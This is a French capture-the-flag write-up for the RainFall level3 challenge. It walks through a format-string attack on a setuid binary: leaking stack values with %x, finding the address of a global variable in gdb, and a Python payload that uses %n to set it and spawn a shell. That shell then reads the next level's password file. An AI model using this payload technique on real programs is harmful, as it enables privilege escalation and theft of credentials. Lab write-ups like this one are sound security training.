# Level3

```
-rwsr-s---+ 1 level4 users  5366 Mar  6  2016 level3
```

Le code decompile nous informe que l'entrée utilisateur est récupérée puis affichée avec printf.
On remarque qu'il n'y a pas de sélecteur (%..) défini avec printf.
Après recherche nous allons exploiter une faille connue sous le nom de "format string".

Nous pouvons afficher ou manipuler le contenu de la stack en injectant les sélecteurs de printf dans l'entrée standard.

```
level3@RainFall:~$ ./level3
%x %x %x %x
200 b7fd1ac0 b7ff37d0 25207825
```
```
level3@RainFall:~$ ./level3
AAAA%x %x %x %x
AAAA200 b7fd1ac0 b7ff37d0 41414141
```

Nous constatons que nous pouvons prendre le contrôle de l'exécution dans la 4e stack frame.
Dans le code nous voyons une condition qui permet de lancer un shell si m == 0x40.

Nous allons récupérer l'adresse de m grace a gdb :
```
(gdb) disas v
Dump of assembler code for function v:
   0x080484a4 <+0>:	push   %ebp
   0x080484a5 <+1>:	mov    %esp,%ebp
   0x080484a7 <+3>:	sub    $0x218,%esp
   0x080484ad <+9>:	mov    0x8049860,%eax
   0x080484b2 <+14>:	mov    %eax,0x8(%esp)
   0x080484b6 <+18>:	movl   $0x200,0x4(%esp)
   0x080484be <+26>:	lea    -0x208(%ebp),%eax
   0x080484c4 <+32>:	mov    %eax,(%esp)
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:	lea    -0x208(%ebp),%eax
   0x080484d2 <+46>:	mov    %eax,(%esp)
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
   0x080484da <+54>:	mov    0x804988c,%eax <== adresse de m pour comparaison
   0x080484df <+59>:	cmp    $0x40,%eax
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
   0x080484e4 <+64>:	mov    0x8049880,%eax
   0x080484e9 <+69>:	mov    %eax,%edx
   0x080484eb <+71>:	mov    $0x8048600,%eax
   0x080484f0 <+76>:	mov    %edx,0xc(%esp)
   0x080484f4 <+80>:	movl   $0xc,0x8(%esp)
   0x080484fc <+88>:	movl   $0x1,0x4(%esp)
   0x08048504 <+96>:	mov    %eax,(%esp)
   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:	movl   $0x804860d,(%esp)
   0x08048513 <+111>:	call   0x80483c0 <system@plt>
   0x08048518 <+116>:	leave
   0x08048519 <+117>:	ret
End of assembler dump.
(gdb) x/x 0x804988c
0x804988c <m>:	0x00000000
```
Maintenant que nous avons l'adresse "0x804988c" nous allons modifier le contenu de "m", grâce qu sélecteur "%n" de printf, qui permet d'écrire dans la mémoire le nombre correspondant aux caractères qui précède "%n".
ex :
```
int i;
printf("Hello%n", &i);
printf(" %d\n", i); // 5
```
Nous allons donc créer le script suivant :
```
python -c 'print("\x8c\x98\x04\x08" + "%60x" + "%4$n")' > /tmp/exploit
```
Qui va écrire a la 4e stackFrame, 64(adresse(4) + caracteres(60)) a l'adresse de "m".

En partant du dernier script, il suffit de mettre nos 60 espaces "%60x", et de donner l'adresse de m a %n pour écrire 64 dedans (0x40 en hexa)

```
level3@RainFall:~$ python -c 'print("\x8c\x98\x04\x08" + "%60x" + "%4$n")' > /tmp/exploit
level3@RainFall:~$ cat /tmp/exploit - | ./level3
?                                                         200
Wait what?!
id
uid=2022(level3) gid=2022(level3) euid=2025(level4) egid=100(users) groups=2025(level4),100(users),2022(level3)
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```